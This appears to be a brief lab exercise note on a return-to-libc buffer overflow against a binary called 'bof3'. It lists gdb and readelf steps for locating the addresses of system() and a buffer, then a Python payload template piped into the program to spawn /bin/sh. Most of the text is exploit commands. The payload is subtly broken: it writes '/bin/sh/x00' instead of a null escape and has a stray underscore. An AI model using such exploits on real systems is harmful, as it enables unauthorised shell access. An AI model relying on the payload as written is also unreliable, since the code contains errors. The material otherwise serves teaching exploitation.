# Buffer overflow : Return to libc
# TARGET FILE : bof3

***TASK1***
symbol check! <br>
: gdb -q bof3
: r
: p system -> system function address
: quit (or exit)
: readelf -s bof3 |grep buffer -> variable address

***TASK2***<br>
Q.) payloads <br>
A.) 
(python -c "print '/bin/sh/x00'+'a'*36 +'function Address'_+'4byte'+'Variable Address'";cat) | ./bof3